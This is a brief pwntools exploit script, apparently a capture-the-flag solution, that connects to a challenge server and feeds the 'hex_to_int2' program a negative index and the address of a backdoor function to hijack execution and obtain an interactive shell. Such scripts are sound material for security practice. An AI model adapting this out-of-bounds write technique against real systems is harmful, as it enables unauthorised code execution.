from pwn import *
context(arch='amd64',os='linux',log_level='debug')
elf=ELF('./hex_to_int2')
p=remote("chals.cyberjousting.com",1365)

backdoor=0x4011D4
p.sendlineafter("table (2)?.",b'2')
p.sendlineafter("add: ",b'-e')
p.sendlineafter("value?",b'4198868')
p.sendlineafter("(2)?.",b'3')
p.interactive()
